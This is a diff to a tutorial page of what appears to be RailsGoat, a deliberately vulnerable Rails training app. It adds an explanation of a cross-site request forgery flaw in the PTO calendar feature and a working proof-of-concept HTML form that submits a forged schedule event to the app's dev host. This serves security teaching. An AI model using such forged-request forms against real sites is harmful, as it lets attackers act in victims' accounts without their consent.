@@ -59,17 +59,27 @@
           <div class="accordion-body collapse" id="collapseThree" style="height: 0px;">
             <div class="accordion-inner">
               <p><b> Cross-Site Request Forgery ATTACK:</b></p>
-				<p>
-					Save this content to an .html file and open it...
+				<p class="desc">
+					The application allows users to update their calendar and schedule PTO events (PTO section). Due to the fact CSRF protections are disabled, the AJAX request will send the authenticity token but the application will <b>not</b> validate either it's presence or validity. Create an html page using the code shown below, authenticate as another user, click on it, review the new calendar (change the dates under date_range1). You should see this HTML code will work, even if you hadn't navigated to the PTO section prior to sending it.
 				</p>
 			   	<p>
-					<font face="Courier New" style="color: rgb(69, 126, 136)">
+				 <pre class="ruby">
 						<%= 
-			   				%{
-			   					
-			   				} 
+ %{
+ 	<html>
+ 	  <body>
+ 	    <form action="http://railsgoat.dev/schedule.json" method="POST">
+ 	      <input type="hidden" name="schedule&#91;event&#95;name&#93;" value="Bad&#32;Guy" />
+ 	      <input type="hidden" name="schedule&#91;event&#95;type&#93;" value="pto" />
+ 	      <input type="hidden" name="schedule&#91;event&#95;desc&#93;" value="Fun&#32;Fun" />
+ 	      <input type="hidden" name="date&#95;range1" value="06&#47;08&#47;2013&#32;&#45;&#32;06&#47;09&#47;2013" />
+ 	      <input type="submit" value="Submit request" />
+ 	    </form>
+ 	  </body>
+ 	</html>
+ } 
 			   			%>
-					</font>
+				  </pre>
 				</p>
 				
 			  <p><b> Cross-Site Request Forgery SOLUTION:</b></p>
@@ -109,7 +119,7 @@
           </div>
           <div class="accordion-body collapse" id="collapseFour" style="height: 0px;">
             <div class="accordion-inner">
-              Under progess....
+              PTO is precious, glad my calendar is safe!
             </div>
           </div>
         </div>
